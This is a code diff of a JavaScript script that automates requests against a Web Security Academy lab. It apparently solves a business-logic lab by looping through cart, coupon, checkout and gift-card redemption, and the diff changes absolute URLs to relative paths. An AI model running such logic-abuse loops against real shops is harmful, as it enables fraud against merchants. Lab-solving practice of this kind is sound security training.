@@ -11,7 +11,7 @@ const iter = async () => {
 	const sess = new Sess()
 
 	await sess.req`
-		POST https://${LABID}.web-security-academy.net/cart HTTP/2
+		POST /cart HTTP/2
 		Host: ${LABID}.web-security-academy.net
 		Cookie: session=iA3sdM0Vd8FlfuKlnyEaRkfmM1yRL3BC
 		Content-Length: 36
@@ -37,7 +37,7 @@ const iter = async () => {
 	`
 
 	await sess.req`
-		POST https://${LABID}.web-security-academy.net/cart/coupon HTTP/2
+		POST /cart/coupon HTTP/2
 		Host: ${LABID}.web-security-academy.net
 		Cookie: session=iA3sdM0Vd8FlfuKlnyEaRkfmM1yRL3BC
 		Content-Length: 53
@@ -63,7 +63,7 @@ const iter = async () => {
 	`
 
 	await sess.req`
-		POST https://${LABID}.web-security-academy.net/cart/checkout HTTP/2
+		POST /cart/checkout HTTP/2
 		Host: ${LABID}.web-security-academy.net
 		Cookie: session=iA3sdM0Vd8FlfuKlnyEaRkfmM1yRL3BC
 		Content-Length: 37
@@ -89,7 +89,7 @@ const iter = async () => {
 	`
 
 	const coupon = await sess.req`
-		GET https://${LABID}.web-security-academy.net/cart/order-confirmation?order-confirmed=true HTTP/2
+		GET /cart/order-confirmation?order-confirmed=true HTTP/2
 		Host: ${LABID}.web-security-academy.net
 		Cookie: session=iA3sdM0Vd8FlfuKlnyEaRkfmM1yRL3BC
 		Sec-Ch-Ua: "Brave";v="119", "Chromium";v="119", "Not?A_Brand";v="24"
@@ -109,7 +109,7 @@ const iter = async () => {
 	`.then(r => r.bodreg(/<th>Code<\/th>\n\s+<\/tr>\n\s+<tr>\n\s+<td>(.*)<\/td>/)![0])
 
 	await sess.req`
-		POST https://${LABID}.web-security-academy.net/gift-card HTTP/2
+		POST /gift-card HTTP/2
 		Host: ${LABID}.web-security-academy.net
 		Cookie: session=iA3sdM0Vd8FlfuKlnyEaRkfmM1yRL3BC
 		Content-Length: 58
